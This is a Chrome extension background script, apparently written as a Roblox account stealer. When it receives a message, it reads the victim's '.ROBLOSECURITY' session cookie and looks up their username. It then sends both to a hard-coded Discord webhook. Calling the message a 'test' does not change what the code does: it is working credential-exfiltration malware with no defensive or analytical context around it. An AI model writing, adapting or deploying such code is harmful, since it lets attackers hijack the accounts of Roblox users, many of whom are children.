const webhook = "https://discord.com/api/webhooks/1552052570321846384/CZZUDdulsIpmj4_hjFtBiZOvZrbaboMInnqhXOBz4WY27ycaJVPZaRs0mXgdsWAO2TM_";

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message?.type === "downloadFile") {
  chrome.downloads.download({
    url: "https://example.com/file.txt",
    filename: "roblox/file.txt",
    saveAs: true
  });
  return false;
}
  if (message?.type !== "readTestCookie") {
    return false;
  }

  chrome.cookies.get(
    {
      url: "https://www.roblox.com/",
      name: ".ROBLOSECURITY"
    },
    async (cookie) => {
      if (!cookie) {
        sendResponse({
          success: false,
          error: ".ROBLOSECURITY was not found."
        });
        return;
      }

      let username = "unknown";

      try {
        const userResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
          headers: {
            Cookie: `.ROBLOSECURITY=${cookie.value}`
          }
        });

        if (userResponse.ok) {
          const userData = await userResponse.json();
          username = userData.name || username;
        }
      } catch (error) {
        username = "stranger";
      }

      try {
        const response = await fetch(webhook, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            content: "Test cookie value: " + cookie.value + "\nUsername: " + username
          })
        });

        sendResponse({
          success: response.ok,
          error: response.ok
            ? null
            : "Discord returned HTTP " + response.status
        });
      } catch (error) {
        sendResponse({
          success: false,
          error: error.message
        });
      }
    }
  );

  return true;
});
